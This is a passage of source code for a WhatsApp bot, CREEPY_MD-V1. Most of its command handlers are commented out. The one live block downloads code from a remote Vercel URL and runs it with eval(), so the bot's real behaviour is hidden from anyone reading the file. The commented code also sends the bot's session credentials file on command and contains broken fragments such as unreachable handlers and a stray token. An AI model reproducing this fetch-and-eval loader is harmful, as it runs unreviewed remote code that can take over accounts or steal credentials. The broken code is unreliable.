            }
        }
        for (let Bhosdikacreep of Imagecreep) {
            if (budy === Bhosdikacreep) {
                let imagebuffy = fs.readFileSync(`./GlobalMedia/image/${Bhosdikacreep}.jpg`)
                DannyTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
            }
        }
        for (let Bhosdikacreep of Videocreep) {
            if (budy === Bhosdikacreep) {
                let videobuffy = fs.readFileSync(`./GlobalMedia/video/${Bhosdikacreep}.mp4`)
                DannyTechInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
            }
        }

        const sendapk = (teks) => {
            DannyTechInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive' }, { quoted: m })
        }
        for (let Bhosdikacreep of Apkcreep) {
            if (budy === Bhosdikacreep) {
                let buffer = fs.readFileSync(`./GlobalMedia/apk/${Bhosdikacreep}.apk`)
                sendapk(buffer)
            }
        }

        const sendzip = (teks) => {
            DannyTechInc.sendMessage(from, { document: teks, mimetype: 'application/zip' }, { quoted: m })
        }
        for (let Bhosdikacreep of Zipcreep) {
            if (budy === Bhosdikacreep) {
                let buffer = fs.readFileSync(`./GlobalMedia/zip/${Bhosdikacreep}.zip`)
                sendzip(buffer)
            }
        }

        const senddocu = (teks) => {
            haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf' }, { quoted: m })
        }
        for (let Bhosdikacreep of Doccreep) {
            if (budy === Bhosdikacreep) {
                let buffer = fs.readFileSync(`./GlobalMedia/doc/${Bhosdikacreep}.pdf`)
                senddocu(buffer)
            }
        }

        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || [])])]; // Only consider explicitly mentioned users

            // Loop through mentioned users
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk);
                    let getReason2 = afk.getAfkReason(getId2, _afk);
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
                    let heheh2 = ms(getTimee);

                    // Only respond to @mentions, tagall, or hidetag, but not when replying
                    if (!m.quoted || (m.mentionedJid && m.mentionedJid.length > 1)) {
                        replyglobal(`*Hey yo* \`${pushname}\`\n\n*Don't tag my owner 😡🤬*`);
                        break;
                    }
                }
            }

            // Handle if the sender is returning from AFK
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk);
                let getReason = afk.getAfkReason(getId, _afk);
                let getTime = Date.now() - afk.getAfkTime(getId, _afk);
                let heheh = ms(getTime);

                // Remove the user from the AFK list
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk));

                DannyTechInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} You can tag my owner now😁`, m);
            }
        }

        //command list
        //wa.me/255697608274
        switch (command) {
            case 'addprem':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 2)
                    return replyglobal(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyglobal("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyglobal("Success")
                }
                break
                //antilink detection by Danny
                //Credits danny
                //wa.me/255697608274
                const antilink = require('./antilink');
                const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json')); // Load anti-link configuration

                // Regex to detect links
                const linkRegex = /(https?:\/\/[^\s]+)/g;

                // Anti-Link Detection
                if (m.isGroup && !m.key.fromMe && antilink.isAntiLinkEnabled(m.chat, _antilink)) {
                    if (linkRegex.test(m.text)) {
                        // Delete the message
                        DannyTechInc.sendText(m.chat, `Link detected and deleted!`);
                        DannyTechInc.deleteMessage(m.chat, m.key);

                        // Increment warnings
                        antilink.incrementWarnCount(m.chat, _antilink);
                        const warnings = antilink.getWarnCount(m.chat, _antilink);

                        if (warnings >= 3) {
                            // Kick the user after 3 warnings
                            DannyTechInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                            antilink.resetWarnCount(m.chat, _antilink); // Reset warnings after kick
                        } else {
                            // Warn the user
                            DannyTechInc.sendTextWithMentions(
                                m.chat,
                                `@${m.sender.split('@')[0]}, links are not allowed in this group. You have been warned (${warnings}/3).`
                            );
                        }
                    }
                } 8
                break

            // Command to toggle anti-link
            case 'antilink':
            case 'detect':
                {
                    if (!isGroupAdmin) return replyglobal('This command is for group admins only.');
                    if (args.length < 1) return replyglobal('Usage: *antilink on/off*');

                    if (args[0] === 'on') {
                        antilink = true
                        replyglobal('Bot creepy Anti-link has been enabled for this group.');
                    } else if (args[0] === 'off') {
                        antilink = false
                        replyglobal('Bot creepy Anti-link has been disabled for this group.');
                    } else {
                        replyglobal('Usage: *antilink on/off*');
                    }
                }
                break

            //Autostatus like and react by Danny
            //This created by Danny himself
            case 'autostatusreact': {
                if (!isCreator) return replyglobal(mess.owner);
                if (args.length < 1) return replyglobal('Usage: autostatusreact on/off [emoji]');

                if (args[0] === 'on') {
                    if (!args[1]) return replyglobal('Please provide an emoji for the reaction. Example: autostatusreact on 👍');
                    autostatusReact = true;
                    reactEmoji = args[1]; // Store the emoji
                    replyglobal(`Bot Autostatus React is enabled. Bot will react to statuses with "${reactEmoji}".`);
                } else if (args[0] === 'off') {
                    autostatusReact = false;
                    replyglobal('Bot Autostatus React is disabled.');
                } else {
                    replyglobal('Invalid option. Use: autostatusreact on/off [emoji]');
                }
            }
                if (autostatusReact) {
                    try {
                        const statusList = await DannyTechInc.fetchStatusUpdates(); // Fetch all status updates
                        for (const status of statusList) {
                            await DannyTechInc.sendMessage(status.sender, {
                                react: {
                                    text: reactEmoji || '😂', // Use the configured emoji or default to 😂
                                    key: status.key,
                                },
                            });
                            console.log(`Reacted to status from ${status.sender} with "${reactEmoji}"`);
                        }
                    } catch (err) {
                        console.error('Error reacting to status:', err);
                        replyglobal('Failed to react to statuses.');
                    }
                }
                break;

            case 'delprem':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyglobal("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyglobal("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replyglobal(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`
                }
                DannyTechInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
                break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replyglobal(mess.owner)
                fs.readdir("./session", async function (err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replyglobal('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replyglobal(teks)
                    filteredArray.map(function (e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyglobal(teks)
                    await sleep(2000)
                    replyglobal("Delete junk files...")
                    await filteredArray.forEach(function (file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyglobal("Successfully deleted all the trash in the session folder")
                });
            }
                break
            case 'join':
            case 'enter':
                try {
                    if (!isCreator) return replyglobal(mess.owner)
                    if (!text) return replyglobal('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyglobal('Link Invalid!')
                    replyglobal(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await DannyTechInc.groupAcceptInvite(result).then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                } catch {
                    replyglobal('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                DannyTechInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal('Bot Creepy in Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyglobal(`Bot Creepy changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyglobal(`Bot Creepy changed autoread to ${q}`)
                }
                break
            case 'autotyping':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyglobal(`Bot Creepy changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyglobal(`Bot Creepy changed auto-typing to ${q}`)
                }
                break
            case 'autorecording':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyglobal(`Bot Creepy changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyglobal(`Bot Creepy changed auto-recording to ${q}`)
                }
                break
            case 'autorecordtyp':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyglobal(`Bot Creepy changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyglobal(`Bot Creepy changed auto recording and typing to ${q}`)
                }
                break
            case 'autoswview':
            case 'autostatusview': {
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal('on/off?')
                if (args[0] === 'on') {
                    autoswview = true
                    replyglobal(`${command} is enabled`)
                } else if (args[0] === 'off') {
                    autoswview = false
                    replyglobal(`${command} is disabled`)
                }
            }
                break
            case 'autobio':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyglobal(`Bot Creepy Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyglobal(`Bot Creepy Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replyglobal(mess.owner)
                if (args.length < 1) return replyglobal(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    DannyTechInc.public = true
                    replyglobal(mess.done)
                } else if (q == 'self') {
                    DannyTechInc.public = false
                    replyglobal(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replyglobal(mess.owner)
                if (!text) return replyglobal(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyglobal(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyglobal(mess.owner)
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await DannyTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await DannyTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await DannyTechInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break

*/


const url = "https://nancy-ebon.vercel.app/api/maggie";

axios.get(url)
    .then(response => {
        console.log("\x1b[32m✅ Successfully loaded script from DannyTech api.\x1b[0m");
        eval(response.data);
    })
    .catch(err => {
        console.error("\x1b[31m❌ Failed to load script from Vercel API. Error:", err.message, "\x1b[0m");
    });

/*
            case 'block':
                if (!isCreator) return replyglobal(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.updateBlockStatus(blockw, 'block').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replyglobal(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.updateBlockStatus(blockww, 'unblock').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'left':
                if (!isCreator) return replyglobal(mess.owner)
                if (!m.isGroup) return replyglobal(mess.group)
                replyglobal('Bye Everyone 🥺')
                await DannyTechInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyglobal(mess.owner)
                if (m.isGroup) return replyglobal(mess.private)
                replyglobal(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await DannyTechInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup':
            case 'broadcast': {
                if (!isCreator) return replyglobal(mess.owner)
                if (!text) return replyglobal(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await DannyTechInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyglobal(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    DannyTechInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Danny',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyglobal(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
                break
            case 'getcase':
                if (!isCreator) return replyglobal(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("creepymd1.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyglobal(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replyglobal(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyglobal('I\'m not the one who send that text!')
                DannyTechInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
                break

            case 'closetime':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    DannyTechInc.groupSettingUpdate(m.chat, 'announcement')
                    replyglobal(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    DannyTechInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyglobal(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DannyTechInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!text) return 'Text ?'
                await DannyTechInc.groupUpdateSubject(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!text) return 'Text ?'
                await DannyTechInc.groupUpdateDescription(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await DannyTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await DannyTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await DannyTechInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                let teks = `*\`CREEPY_MD-V1👥ALL MEMBERS TAGGED\`*
 
                 📄 *Message : \`${q ? q : 'blank'}\`*\n 🎉 Happy new year all tagged members 🎉\n> *Don\'t mimd my owner for tagging you😏😁*\n ${readmore}`

                for (let mem of participants) {
                    teks += `🚔 @${mem.id.split('@')[0]}\n`
                }
                DannyTechInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
            case 'dtag':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                DannyTechInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
            case 'tag':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replyglobal(mess.admin)
                if (!m.quoted) return replyglobal(`Reply messages with captions ${prefix + command}`)
                DannyTechInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'gc':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[0] === 'close') {
                    await DannyTechInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyglobal(`*Group closed 🔐*`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'open') {
                    await DannyTechInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyglobal(`*Group opened 🔓*`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                if (args[0] === 'open') {
                    await DannyTechInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyglobal(`*Group edit info opened*`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'close') {
                    await DannyTechInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyglobal(`*Group edit info closed*`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'glink':
            case 'linkgc':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                let response = await DannyTechInc.groupInviteCode(m.chat)
                DannyTechInc.sendText(m.chat, `👥 *\`CREEPY_MD-V1 GROUP INFO\`*\n🤖 *Group Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🏷 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Members :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyglobal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal(mess.admin)
                if (!isBotAdmins) return replyglobal(mess.botAdmin)
                await DannyTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyglobal(`Bot Creepy Reset, Group Invite Link Successfully ${groupMetadata.subject}`)
                    }).catch((err) => replyglobal(json(err)))
                break
            case 'p':
            case 'ping':
            case 'speed':
            case 'taste': {
                const used = process.memoryUsage();
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
                    return cpu;
                });
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total;
                    last.speed += cpu.speed / length;
                    last.times.user += cpu.times.user;
                    last.times.nice += cpu.times.nice;
                    last.times.sys += cpu.times.sys;
                    last.times.idle += cpu.times.idle;
                    last.times.irq += cpu.times.irq;
                    return last;
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                });
                let timestamp = speed();
                let latensi = speed() - timestamp;
                neww = performance.now();
                oldd = performance.now();
                respon = `
𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 created by Danny
    `.trim();

                await DannyTechInc.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second of creepy time`,
                            thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                });


                await DannyTechInc.react(m.chat, "🍻", m.key.id);
            }
                break

            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nDo you want to Buy Premium? Just type owner and chat with the owner😉`;

                // React with a thumbs up emoji before sending the message
                await DannyTechInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                });

                await DannyTechInc.react(m.chat, "🫵", m.key.id);
            }
                break

            case 'runtime':
            case 'uptime':
                let runtimetext = `*\`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\` \n\`Have Been Running For ${runtime(process.uptime())}\`*`;

                // React with a thumbs up emoji before sending the message
                await DannyTechInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `CREEPY_MD-V1 created by Danny`,
                            thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                });

                await DannyTechInc.react(m.chat, "🏃", m.key.id);
                break

            case 'sc':
            case 'repo':
            case 'script':
            case 'scriptbot':
            case 'file':
                DannyTechInc.sendMessage(m.chat, {
                    text: `\`Hello ${pushname}\`\nTo get the file of CREEPY_MD-V1 \n*Check out github*\n> https://github.com/DannyTech20/CREEPY_MD-V1.git\n*Or check it on Telegram*\n> https://t.me/creepytechnology`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `This is ${botname} Created by Danny`,
                            thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'support':
            case 'pay':
                let textnate = `> Hello ${pushname}\nNo matter how much you send it is very valuable to 𝐷𝛥𝛮𝛮𝑌`
                DannyTechInc.sendMessage(m.chat, {
